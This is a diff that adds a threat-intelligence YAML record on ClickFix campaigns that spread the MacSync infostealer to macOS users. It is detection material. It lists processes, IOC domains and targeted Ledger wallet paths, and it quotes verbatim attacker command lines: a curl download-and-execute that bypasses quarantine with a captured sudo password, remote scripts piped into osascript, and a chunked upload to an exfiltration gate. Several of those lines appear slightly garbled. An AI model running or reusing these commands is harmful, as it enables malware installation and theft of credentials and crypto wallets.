@@ -1,0 +1,72 @@
+description: ClickFix campaigns targeting macOS users with the MacSync infostealer
+  using social engineering techniques.
+malware_families:
+- MacSync
+- MacOS Infostealer
+TTPs:
+  processes:
+  - Terminal
+  - curl
+  - osascript
+  - zsh
+  commandline:
+  - 'echo "Apple-Installer: https://tenkmo.com/drive/update" > /tmp/update && chmod
+    +x /tmp/update && /tmp/update'
+  - curl -o /tmp/update https://tenkmo.com/drive/update >/dev/null 2>&1 && echo "$password" | sudo -S xattr -c /tmp/update >/dev/null 2>&1 && chmod +x /tmp/update && /tmp/update
+  - 'curl -k -s --max-time 30 -H "User-Agent: Mozilla/5. (Macintosh; Intel Mac OSX 1@_15_7) AppleWebKit/537.36" -H "api-key: $api_key" \"http://$domain/dynamic?txd=$token&pwd=$1\"| osascript'
+  - 'curl -k -s --max-time 30 -H "User-Agent: Mozilla/5. (Macintosh; Intel Mac OSX 1@_15_7) AppleWebKit/537.36" -H "api-key: $api_key" \"http://$domain/dynamic?txd=$token\" | osascript'
+  - 'curl -k -s -X PUT --data-binary @ -H "User-Agent: Mozilla/5.8 (Macintosh; Intel Mac 0S X 18_15_7) AppleWebKit/537.36" -H "api-key: $api_key" --max-time 180 -0 /dev/null -w "%({http_code}" \"http://$domain/gate?buildtxd=$tokendupload_id=$upload_id&chunk_index=$i&total_chunks=$total_chunks\" 25/dev/null'
+  scripting_engine:
+  - Bash
+  - AppleScript
+  - VBS
+  - JScript
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - curl https://tenkmo.com/drive/update
+  - 'fetch("stats.php", {method: "POST"})'
+  - curl -> houstongaragedoorinstallers[.]com
+  - curl -> http://$domain/dynamic?txd=$token&pwd=$1
+  - curl -> http://$domain/gate?buildtxd=$tokendupload_id=$upload_id&chunk_index=$i&total_chunks=$total_chunks
+  file_activity:
+  - /tmp/update
+  - /tmp/osalogging.zip
+  - /Applications/Ledger Wallet.app/Contents/Resources/app.asar
+  - /Applications/Ledger Live.app/Contents/Resources/app.asar
+  persistence:
+  - Relaunches itself as a background daemon to maintain stealth and persistence
+  process_relations:
+  - zsh -> curl
+IOCs:
+  hashes: []
+  ip_addresses: []
+  domains:
+  - get-mactech[.]com
+  - getmaclab[.]com
+  - getmacnow[.]com
+  - imaclife[.]com
+  - insta-macer[.]com
+  - instmac[.]com
+  - mac-faster[.]com
+  - mac-fast[.]com
+  - mac-space[.]com
+  - macfixnow[.]com
+  - mymachub[.]com
+  - mymacsoft[.]com
+  - houstongaragedoorinstallers[.]com
+  - main.mon2gate.net
+  urls:
+  - https://tenkmo.com/drive/update
+  - stats.php
+  - http://$domain/dynamic?txd=$token&pwd=$1
+  - http://$domain/gate?buildtxd=$tokendupload_id=$upload_id&chunk_index=$i&total_chunks=$total_chunks
+  - https://main.mon2gate.net/modules/wallets
+authors:
+- Jagadeesh Chandraiah
+- Tonmoy Jitu
+- Dmitry Samosseiko
+- Matt Wixey
+reference: https://www.sophos.com/en-us/blog/evil-evolution-clickfix-and-macos-infostealers
+date_of_publication: March 11, 2026
+file_creation_date: March 14, 2026
